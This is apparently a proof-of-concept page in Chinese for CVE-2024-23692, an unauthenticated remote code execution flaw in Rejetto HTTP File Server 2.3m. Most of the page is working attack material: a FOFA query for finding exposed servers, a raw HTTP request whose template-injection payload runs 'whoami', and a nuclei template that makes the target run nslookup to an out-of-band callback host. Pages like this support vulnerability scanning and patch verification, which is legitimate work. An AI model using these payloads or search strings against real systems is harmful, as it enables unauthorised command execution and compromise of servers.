## HFS2.3未经身份验证的远程代码执行(CVE-2024-23692)

Rejetto HTTP 文件服务器 2.3m 未经身份验证的 RCE

## fofa

```
"HttpFileServer"
```

## poc

```
GET /?n=%0A&cmd=whoami&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.} HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: HFS_SID_=0.590236319694668
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406092216228.png)

![image-20240611150501738](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406111505997.png)

## nuclei

```
id: CVE-2024-23692

info:
  name: Rejetto HTTP File Server - Template injection
  author: johnk3r
  severity: critical
  description: |
    This vulnerability allows a remote, unauthenticated attacker to execute arbitrary commands on the affected system by sending a specially crafted HTTP request.
  reference:
    - https://github.com/rapid7/metasploit-framework/pull/19240
    - https://mohemiv.com/all/rejetto-http-file-server-2-3m-unauthenticated-rce/
  metadata:
    verified: true
    max-request: 1
    shodan-query: product:"HttpFileServer httpd"
  tags: cve,cve2024,hfs,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}/?n=%0A&cmd=nslookup+{{interactsh-url}}&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}"

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: word
        part: body
        words:
          - "rejetto"
```

